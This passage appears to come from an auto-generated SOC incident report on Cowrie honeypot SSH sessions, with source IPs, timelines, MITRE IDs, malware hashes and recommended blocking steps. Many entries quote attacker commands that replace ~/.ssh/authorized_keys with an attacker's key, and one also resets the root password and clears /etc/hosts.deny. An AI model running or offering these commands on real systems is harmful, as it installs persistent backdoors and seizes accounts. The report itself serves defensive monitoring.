| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:07:45` | `cowrie.session.connect` |
| `2026-06-04 08:07:46` | `cowrie.client.version` |
| `2026-06-04 08:07:46` | `cowrie.client.kex` |
| `2026-06-04 08:07:46` | `cowrie.login.success` |
| `2026-06-04 08:07:47` | `cowrie.session.params` |
| `2026-06-04 08:07:47` | `cowrie.command.input` |
| `2026-06-04 08:07:47` | `cowrie.command.failed` |
| `2026-06-04 08:07:47` | `cowrie.log.closed` |
| `2026-06-04 08:07:47` | `cowrie.session.params` |
| `2026-06-04 08:07:47` | `cowrie.command.input` |
| `2026-06-04 08:07:47` | `cowrie.session.file_download` |
| `2026-06-04 08:07:47` | `cowrie.log.closed` |
| `2026-06-04 08:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.227.203[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.227.203[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4315357353f5

| Field | Detail |
|---|---|
| **Source IP** | `101.227.203[.]162` |
| **First Seen** | 2026-06-04 08:07 |
| **Last Seen** | 2026-06-04 08:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:07:49` | `cowrie.session.connect` |
| `2026-06-04 08:07:49` | `cowrie.client.version` |
| `2026-06-04 08:07:49` | `cowrie.client.kex` |
| `2026-06-04 08:07:50` | `cowrie.login.success` |
| `2026-06-04 08:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.227.203[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.227.203[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7378af0b466

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:09 |
| **Last Seen** | 2026-06-04 08:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:09:13` | `cowrie.session.connect` |
| `2026-06-04 08:09:13` | `cowrie.client.version` |
| `2026-06-04 08:09:13` | `cowrie.client.kex` |
| `2026-06-04 08:09:14` | `cowrie.login.success` |
| `2026-06-04 08:09:14` | `cowrie.session.params` |
| `2026-06-04 08:09:14` | `cowrie.command.input` |
| `2026-06-04 08:09:14` | `cowrie.command.failed` |
| `2026-06-04 08:09:14` | `cowrie.log.closed` |
| `2026-06-04 08:09:14` | `cowrie.session.params` |
| `2026-06-04 08:09:14` | `cowrie.command.input` |
| `2026-06-04 08:09:14` | `cowrie.session.file_download` |
| `2026-06-04 08:09:14` | `cowrie.log.closed` |
| `2026-06-04 08:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3a823bed6e

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:09 |
| **Last Seen** | 2026-06-04 08:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:09:16` | `cowrie.session.connect` |
| `2026-06-04 08:09:16` | `cowrie.client.version` |
| `2026-06-04 08:09:16` | `cowrie.client.kex` |
| `2026-06-04 08:09:16` | `cowrie.login.success` |
| `2026-06-04 08:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce3bc1a25cb

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:11 |
| **Last Seen** | 2026-06-04 08:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:11:28` | `cowrie.session.connect` |
| `2026-06-04 08:11:28` | `cowrie.client.version` |
| `2026-06-04 08:11:28` | `cowrie.client.kex` |
| `2026-06-04 08:11:28` | `cowrie.login.success` |
| `2026-06-04 08:11:28` | `cowrie.session.params` |
| `2026-06-04 08:11:28` | `cowrie.command.input` |
| `2026-06-04 08:11:28` | `cowrie.command.failed` |
| `2026-06-04 08:11:29` | `cowrie.log.closed` |
| `2026-06-04 08:11:29` | `cowrie.session.params` |
| `2026-06-04 08:11:29` | `cowrie.command.input` |
| `2026-06-04 08:11:29` | `cowrie.session.file_download` |
| `2026-06-04 08:11:29` | `cowrie.log.closed` |
| `2026-06-04 08:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e7a48396bae

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:11 |
| **Last Seen** | 2026-06-04 08:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:11:30` | `cowrie.session.connect` |
| `2026-06-04 08:11:30` | `cowrie.client.version` |
| `2026-06-04 08:11:30` | `cowrie.client.kex` |
| `2026-06-04 08:11:31` | `cowrie.login.success` |
| `2026-06-04 08:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0456bdbdc8b5

| Field | Detail |
|---|---|
| **Source IP** | `101.227.203[.]162` |
| **First Seen** | 2026-06-04 08:11 |
| **Last Seen** | 2026-06-04 08:12 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:7uzaq0wPPTIo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:11:59` | `cowrie.session.connect` |
| `2026-06-04 08:12:00` | `cowrie.client.version` |
| `2026-06-04 08:12:00` | `cowrie.client.kex` |
| `2026-06-04 08:12:00` | `cowrie.login.success` |
| `2026-06-04 08:12:00` | `cowrie.session.params` |
| `2026-06-04 08:12:00` | `cowrie.command.input` |
| `2026-06-04 08:12:00` | `cowrie.command.failed` |
| `2026-06-04 08:12:01` | `cowrie.log.closed` |
| `2026-06-04 08:12:01` | `cowrie.session.params` |
| `2026-06-04 08:12:01` | `cowrie.command.input` |
| `2026-06-04 08:12:01` | `cowrie.session.file_download` |
| `2026-06-04 08:12:01` | `cowrie.log.closed` |
| `2026-06-04 08:12:13` | `cowrie.session.params` |
| `2026-06-04 08:12:13` | `cowrie.command.input` |
| `2026-06-04 08:12:13` | `cowrie.log.closed` |
| `2026-06-04 08:12:14` | `cowrie.session.params` |
| `2026-06-04 08:12:14` | `cowrie.command.input` |
| `2026-06-04 08:12:14` | `cowrie.log.closed` |
| `2026-06-04 08:12:14` | `cowrie.session.params` |
| `2026-06-04 08:12:14` | `cowrie.command.input` |
| `2026-06-04 08:12:14` | `cowrie.session.file_download` |
| `2026-06-04 08:12:14` | `cowrie.log.closed` |
| `2026-06-04 08:12:15` | `cowrie.session.params` |
| `2026-06-04 08:12:15` | `cowrie.command.input` |
| `2026-06-04 08:12:15` | `cowrie.log.closed` |
| `2026-06-04 08:12:15` | `cowrie.session.params` |
| `2026-06-04 08:12:15` | `cowrie.command.input` |
| `2026-06-04 08:12:15` | `cowrie.log.closed` |
| `2026-06-04 08:12:16` | `cowrie.session.params` |
| `2026-06-04 08:12:16` | `cowrie.command.input` |
| `2026-06-04 08:12:16` | `cowrie.command.input` |
| `2026-06-04 08:12:16` | `cowrie.log.closed` |
| `2026-06-04 08:12:16` | `cowrie.session.params` |
| `2026-06-04 08:12:16` | `cowrie.command.input` |
| `2026-06-04 08:12:16` | `cowrie.log.closed` |
| `2026-06-04 08:12:16` | `cowrie.session.params` |
| `2026-06-04 08:12:16` | `cowrie.command.input` |
| `2026-06-04 08:12:17` | `cowrie.log.closed` |
| `2026-06-04 08:12:17` | `cowrie.session.params` |
| `2026-06-04 08:12:17` | `cowrie.command.input` |
| `2026-06-04 08:12:17` | `cowrie.log.closed` |
| `2026-06-04 08:12:17` | `cowrie.session.params` |
| `2026-06-04 08:12:17` | `cowrie.command.input` |
| `2026-06-04 08:12:17` | `cowrie.log.closed` |
| `2026-06-04 08:12:18` | `cowrie.session.params` |
| `2026-06-04 08:12:18` | `cowrie.command.input` |
| `2026-06-04 08:12:18` | `cowrie.log.closed` |
| `2026-06-04 08:12:18` | `cowrie.session.params` |
| `2026-06-04 08:12:18` | `cowrie.command.input` |
| `2026-06-04 08:12:18` | `cowrie.log.closed` |
| `2026-06-04 08:12:19` | `cowrie.session.params` |
| `2026-06-04 08:12:19` | `cowrie.command.input` |
| `2026-06-04 08:12:19` | `cowrie.log.closed` |
| `2026-06-04 08:12:19` | `cowrie.session.params` |
| `2026-06-04 08:12:19` | `cowrie.command.input` |
| `2026-06-04 08:12:19` | `cowrie.log.closed` |
| `2026-06-04 08:12:20` | `cowrie.session.params` |
| `2026-06-04 08:12:20` | `cowrie.command.input` |
| `2026-06-04 08:12:20` | `cowrie.log.closed` |
| `2026-06-04 08:12:20` | `cowrie.session.params` |
| `2026-06-04 08:12:20` | `cowrie.command.input` |
| `2026-06-04 08:12:20` | `cowrie.log.closed` |
| `2026-06-04 08:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.227.203[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.227.203[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70f6e15bbbd4

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:15 |
| **Last Seen** | 2026-06-04 08:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:15:59` | `cowrie.session.connect` |
| `2026-06-04 08:15:59` | `cowrie.client.version` |
| `2026-06-04 08:15:59` | `cowrie.client.kex` |
| `2026-06-04 08:16:00` | `cowrie.login.success` |
| `2026-06-04 08:16:00` | `cowrie.session.params` |
| `2026-06-04 08:16:00` | `cowrie.command.input` |
| `2026-06-04 08:16:00` | `cowrie.command.failed` |
| `2026-06-04 08:16:00` | `cowrie.log.closed` |
| `2026-06-04 08:16:00` | `cowrie.session.params` |
| `2026-06-04 08:16:00` | `cowrie.command.input` |
| `2026-06-04 08:16:00` | `cowrie.session.file_download` |
| `2026-06-04 08:16:00` | `cowrie.log.closed` |
| `2026-06-04 08:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6900fac05e

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:16 |
| **Last Seen** | 2026-06-04 08:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:16:02` | `cowrie.session.connect` |
| `2026-06-04 08:16:02` | `cowrie.client.version` |
| `2026-06-04 08:16:02` | `cowrie.client.kex` |
| `2026-06-04 08:16:02` | `cowrie.login.success` |
| `2026-06-04 08:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b8f4795d7a

| Field | Detail |
|---|---|
| **Source IP** | `36.82.45[.]61` |
| **First Seen** | 2026-06-04 08:18 |
| **Last Seen** | 2026-06-04 08:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:18:32` | `cowrie.session.connect` |
| `2026-06-04 08:18:32` | `cowrie.client.version` |
| `2026-06-04 08:18:32` | `cowrie.client.kex` |
| `2026-06-04 08:18:33` | `cowrie.login.success` |
| `2026-06-04 08:18:33` | `cowrie.session.params` |
| `2026-06-04 08:18:33` | `cowrie.command.input` |
| `2026-06-04 08:18:33` | `cowrie.command.failed` |
| `2026-06-04 08:18:33` | `cowrie.log.closed` |
| `2026-06-04 08:18:33` | `cowrie.session.params` |
| `2026-06-04 08:18:33` | `cowrie.command.input` |
| `2026-06-04 08:18:33` | `cowrie.session.file_download` |
| `2026-06-04 08:18:33` | `cowrie.log.closed` |
| `2026-06-04 08:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.82.45[.]61` to AbuseIPDB if not already reported
- [ ] Block `36.82.45[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9230124623

| Field | Detail |
|---|---|
| **Source IP** | `36.82.45[.]61` |
| **First Seen** | 2026-06-04 08:18 |
| **Last Seen** | 2026-06-04 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:18:35` | `cowrie.session.connect` |
| `2026-06-04 08:18:35` | `cowrie.client.version` |
| `2026-06-04 08:18:35` | `cowrie.client.kex` |
| `2026-06-04 08:18:35` | `cowrie.login.success` |
| `2026-06-04 08:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.82.45[.]61` to AbuseIPDB if not already reported
- [ ] Block `36.82.45[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176f6c18e9cd

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:22 |
| **Last Seen** | 2026-06-04 08:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:22:52` | `cowrie.session.connect` |
| `2026-06-04 08:22:52` | `cowrie.client.version` |
| `2026-06-04 08:22:52` | `cowrie.client.kex` |
| `2026-06-04 08:22:52` | `cowrie.login.success` |
| `2026-06-04 08:22:53` | `cowrie.session.params` |
| `2026-06-04 08:22:53` | `cowrie.command.input` |
| `2026-06-04 08:22:53` | `cowrie.command.failed` |
| `2026-06-04 08:22:53` | `cowrie.log.closed` |
| `2026-06-04 08:22:53` | `cowrie.session.params` |
| `2026-06-04 08:22:53` | `cowrie.command.input` |
| `2026-06-04 08:22:53` | `cowrie.session.file_download` |
| `2026-06-04 08:22:53` | `cowrie.log.closed` |
| `2026-06-04 08:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1b012cb932

| Field | Detail |
|---|---|
| **Source IP** | `115.135.233[.]75` |
| **First Seen** | 2026-06-04 08:22 |
| **Last Seen** | 2026-06-04 08:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:22:55` | `cowrie.session.connect` |
| `2026-06-04 08:22:55` | `cowrie.client.version` |
| `2026-06-04 08:22:55` | `cowrie.client.kex` |
| `2026-06-04 08:22:55` | `cowrie.login.success` |
| `2026-06-04 08:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.135.233[.]75` to AbuseIPDB if not already reported
- [ ] Block `115.135.233[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-338f53054df5

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-06-04 08:23 |
| **Last Seen** | 2026-06-04 08:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:23:56` | `cowrie.session.connect` |
| `2026-06-04 08:23:56` | `cowrie.client.version` |
| `2026-06-04 08:23:56` | `cowrie.client.kex` |
| `2026-06-04 08:23:57` | `cowrie.login.success` |
| `2026-06-04 08:23:57` | `cowrie.session.params` |
| `2026-06-04 08:23:57` | `cowrie.command.input` |
| `2026-06-04 08:23:57` | `cowrie.command.failed` |
| `2026-06-04 08:23:58` | `cowrie.log.closed` |
| `2026-06-04 08:23:58` | `cowrie.session.params` |
| `2026-06-04 08:23:58` | `cowrie.command.input` |
| `2026-06-04 08:23:58` | `cowrie.session.file_download` |
| `2026-06-04 08:23:58` | `cowrie.log.closed` |
| `2026-06-04 08:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72586731b58

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-06-04 08:24 |
| **Last Seen** | 2026-06-04 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
